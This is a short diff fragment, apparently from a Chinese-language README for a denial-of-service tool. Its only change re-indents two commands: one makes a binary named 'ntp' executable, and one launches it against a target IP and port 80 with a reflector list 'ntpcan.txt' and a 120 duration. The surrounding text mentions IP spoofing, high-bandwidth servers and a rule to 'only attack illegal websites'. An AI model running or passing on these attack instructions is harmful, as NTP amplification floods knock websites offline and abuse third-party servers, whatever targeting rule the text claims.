@@ -13,8 +13,8 @@
                 - IP伪装: 把一个IP地址同时分裂成N个全球不同IP地址
             - 3.连接[大流量服务器]
 
-            >>> chmod 777 ntp
-            >>> ./ntp ip 80 ntpcan.txt 2 -1 120
+>>>chmod 777 ntp
+>>> ./ntp ip 80 ntpcan.txt 2 -1 120
 
 ** 法则: **
     - 1.只攻击非法网站; 
